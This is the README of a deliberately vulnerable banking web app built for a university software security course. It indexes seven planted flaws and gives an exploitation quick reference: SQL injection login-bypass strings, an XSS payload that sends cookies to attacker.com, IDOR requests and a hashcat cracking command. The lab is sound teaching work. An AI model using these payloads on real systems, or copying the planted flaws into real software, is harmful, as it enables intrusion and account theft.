# 8TechBank — Intentionally Vulnerable Banking Portal

> **⚠️ DISCLAIMER: This application is intentionally insecure for educational use only. Never deploy on a public-facing server.**

A simulated online banking portal built for the BSE 4202 Software Security course. Designed to demonstrate and practice exploitation of common web application vulnerabilities.

---

## Setup

### Method 1 — Docker (Recommended)

```bash
docker compose up --build
```

Visit: [http://localhost:5000](http://localhost:5000)

The database auto-initializes and seeds on first run. No manual steps required.

### Method 2 — Local Python

```bash
pip install flask
python app.py
```

Visit: [http://localhost:5000](http://localhost:5000)

---

## Default Credentials

| Username | Password    | Role  | Account    |
|----------|-------------|-------|------------|
| admin    | admin123    | admin | 8TB-000001 |
| user1    | password123 | user  | 8TB-XXXXXX |
| user2    | password123 | user  | 8TB-XXXXXX |
| user3    | password123 | user  | 8TB-XXXXXX |
| user4    | password123 | user  | 8TB-XXXXXX |
| user5    | password123 | user  | 8TB-XXXXXX |

> Account numbers for user1–user5 are randomly generated at seed time. Check the admin panel or DB to find them.

---

## Known Vulnerabilities Index

| # | Vulnerability         | Location                          | CWE     |
|---|-----------------------|-----------------------------------|---------|
| 1 | SQL Injection         | `/login`, `/admin` search         | CWE-89  |
| 2 | Weak Hashing (MD5)    | `database.py`, `/register`        | CWE-327 |
| 3 | XSS                   | `/transactions` memo, `/profile`  | CWE-79  |
| 4 | IDOR (transactions)   | `/transactions?user_id=`          | CWE-639 |
| 5 | IDOR (transfer)       | `/transfer` POST `sender_id`      | CWE-639 |
| 6 | Broken Access Control | `/admin` (no role check)          | CWE-284 |
| 7 | Sensitive Data Leak   | `/api/user/profile`               | CWE-200 |

---

## Exploitation Quick Reference

### 1. SQL Injection — Login Bypass
```
Username: admin' --
Password: anything
```
Or dump all users:
```
Username: ' OR '1'='1
Password: ' OR '1'='1
```

### 2. SQL Injection — Admin Search
Navigate to `/admin?search=' OR '1'='1`

### 3. XSS — Transaction Memo
Submit a transfer with memo:
```html
<script>alert('XSS')</script>
```
Or a cookie stealer:
```html
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

### 4. IDOR — View Any User's Transactions
```
GET /transactions?user_id=1
GET /transactions?user_id=2
```

### 5. IDOR — Transfer from Any Account
Intercept the confirm transfer POST and change `sender_id` to any user's ID.

### 6. Broken Access Control — Admin Panel
Log in as any regular user and navigate to `/admin`.

### 7. Sensitive Data Leak — API
```
GET /api/user/profile
```
Returns full DB row including MD5 password hash. Crack offline with hashcat:
```bash
hashcat -m 0 -a 0 <hash> rockyou.txt
```

---

## Project Structure

```
8techbank/
├── Dockerfile
├── docker-compose.yml
├── .dockerignore
├── requirements.txt
├── app.py
├── database.py
├── schema.sql
├── /routes
│   ├── auth.py
│   ├── dashboard.py
│   ├── transfer.py
│   ├── transactions.py
│   ├── admin.py
│   ├── profile.py
│   └── api.py
├── /templates
│   ├── base.html
│   ├── login.html
│   ├── register.html
│   ├── dashboard.html
│   ├── transfer.html
│   ├── transactions.html
│   ├── admin.html
│   ├── profile.html
│   ├── 404.html
│   └── 500.html
├── /static
│   ├── style.css
│   └── app.js
└── /data
    └── .gitkeep
```
